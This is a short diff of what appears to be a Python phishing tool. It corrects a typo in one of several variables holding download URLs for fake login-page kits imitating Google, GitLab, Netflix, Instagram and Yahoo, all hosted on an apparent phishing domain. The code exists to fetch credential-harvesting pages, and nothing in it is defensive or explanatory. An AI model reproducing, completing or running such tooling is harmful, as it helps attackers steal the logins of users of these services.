@@ -1,6 +1,6 @@
 import requests
 phishing_Google = "https://phishing.blackwin.ir/assets/pages/google.zip"
-phishing_Gitlab = "https://phishing.blackwin.irassets/pages/gitlab.zip"
+phishing_Gitlab = "https://phishing.blackwin.ir/assets/pages/gitlab.zip"
 phishing_NetFlix = "https://phishing.blackwin.ir/assets/pages/netflix.zip"
 phishing_Instagram = "https://phishing.blackwin.ir/assets/pages/instagram.zip"
 phishing_Yahoo = "https://phishing.blackwin.ir/assets/pages/yahoo.zip"
